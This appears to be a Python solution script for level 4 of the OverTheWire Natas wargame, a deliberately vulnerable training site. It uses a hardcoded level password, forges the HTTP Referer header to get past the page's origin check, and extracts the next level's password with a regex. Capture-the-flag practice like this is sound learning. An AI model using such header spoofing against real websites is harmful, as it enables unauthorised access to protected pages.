# -*- coding: utf-8 -*-
from base import get_page
import re

username = "natas4"
password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}
content = get_page(4, username, password, headers=headers)
password = re.search(r"(?<=natas5 is )\w+", content)
if password is not None:
    print(password.group(0))
else:
    print("Fail to find password")